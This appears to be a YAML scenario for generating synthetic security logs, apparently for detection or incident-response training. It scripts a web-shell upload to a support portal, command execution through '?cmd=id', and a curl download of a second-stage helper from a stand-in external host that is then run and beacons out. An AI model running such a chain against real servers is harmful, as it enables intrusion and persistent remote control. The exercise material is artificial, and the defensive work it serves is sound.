storyline:
- id: web-enumeration
  time: +45m
  actor: www-data
  system: LW-WEB-01
  activity: An external client enumerates support-portal paths with a directory scanner.
  events:
  - type: web_scan
    source_ip: 198.51.100.77
    dst_ip: 203.0.113.44
    hostname: support.lanternworks.example
    dst_port: 80
    preset: gobuster
    rate: 1.4
    count: 95
    jitter: 0.45
    ids_alerts:
    - sid: 2002910
- id: upload-rejected
  time: +1h5m
  actor: www-data
  system: LW-WEB-01
  activity: An upload without the required filename extension is rejected.
  events:
  - type: connection
    source_ip: 198.51.100.77
    dst_ip: 203.0.113.44
    dst_port: 80
    hostname: support.lanternworks.example
    service: http
    method: POST
    uri: /support/upload.php
    status_code: 403
    request_body_len: 310
    response_body_len: 82
- id: webshell-upload
  time: +1h8m
  actor: www-data
  system: LW-WEB-01
  activity: A vulnerable attachment handler accepts a server-side script in the upload directory.
  events:
  - type: connection
    source_ip: 198.51.100.77
    dst_ip: 203.0.113.44
    dst_port: 80
    hostname: support.lanternworks.example
    service: http
    method: POST
    uri: /support/upload.php
    status_code: 201
    request_multipart:
      parts:
      - name: attachment
        filename: status.php
        body_len: 512
        content_type: application/x-php
    response_body_len: 78
    ids_alerts:
    - sid: 2012647
    technique: T1505.003
- id: php-worker
  time: +1h9m
  actor: www-data
  system: LW-WEB-01
  activity: The PHP worker services the uploaded script.
  events:
  - type: process
    process_name: /usr/sbin/php-fpm8.3
    command_line: 'php-fpm: pool www'
    process_ref: php-worker
- id: command-request
  time: +1h10m
  actor: www-data
  system: LW-WEB-01
  activity: The external client requests command execution through the uploaded script.
  events:
  - type: connection
    source_ip: 198.51.100.77
    dst_ip: 203.0.113.44
    dst_port: 80
    hostname: support.lanternworks.example
    service: http
    method: GET
    uri: /uploads/status.php?cmd=id
    status_code: 200
    response_body_len: 54
- id: web-process-execution
  time: +1h10m2s
  actor: www-data
  system: LW-WEB-01
  activity: The web worker creates a command shell and queries its service identity.
  events:
  - type: process
    process_name: /bin/sh
    command_line: /bin/sh -c id
    process_ref: web-shell
    parent_ref: php-worker
  - type: process
    process_name: /usr/bin/id
    command_line: id
    parent_ref: web-shell
- id: host-discovery
  time: +1h13m
  actor: www-data
  system: LW-WEB-01
  activity: The foothold checks the kernel and host identity.
  events:
  - type: process
    process_name: /usr/bin/uname
    command_line: uname -a
    parent_ref: php-worker
- id: payload-fetch
  time: +1h17m
  actor: www-data
  system: LW-WEB-01
  activity: A command-line client retrieves a secondary Linux helper from external infrastructure.
  events:
  - type: process
    process_name: /usr/bin/curl
    command_line: curl -fsS http://status.artifact-cache.example/dist/cache-maint -o /tmp/cache-maint
    parent_ref: php-worker
  - type: connection
    dst_ip: 198.51.100.78
    dst_port: 80
    hostname: status.artifact-cache.example
    service: http
    method: GET
    uri: /dist/cache-maint
    user_agent: curl/8.5.0
    response_body_len: 49152
    status_code: 200
- id: helper-execution
  time: +1h19m
  actor: www-data
  system: LW-WEB-01
  activity: The helper is made executable and started under the compromised web service account.
  events:
  - type: process
    process_name: /usr/bin/chmod
    command_line: chmod 700 /tmp/cache-maint
    parent_ref: php-worker
  - type: process
    process_name: /tmp/cache-maint
    command_line: /tmp/cache-maint --mode service
    process_ref: linux-agent
    parent_ref: php-worker
- id: sparse-callback
  time: +1h20m
  actor: www-data
  system: LW-WEB-01
  activity: The new helper makes sparse encrypted callbacks.
  events:
  - type: beacon
    dst_ip: 198.51.100.78
    hostname: status.artifact-cache.example
    dst_port: 443
    service: ssl
    profile: sparse_poll
    interval: 4m
    duration: 42m
    jitter: 0.3
red_herrings:
- id: approved-web-audit
  time: +3h
  actor: omar.rahman
  system: LW-WEB-01
  activity: The administrator runs an approved web audit from the management workstation.
  events:
  - type: web_scan
    source_ip: 10.64.10.24
    dst_ip: 203.0.113.44
    hostname: support.lanternworks.example
    dst_port: 80
    preset: nikto
    rate: 0.4
    count: 45
    jitter: 0.5
  explanation: An approved scanner produces conspicuous request patterns but lacks the accepted upload,
    command request and web-worker child chain.
scenario_version: 1.0.0
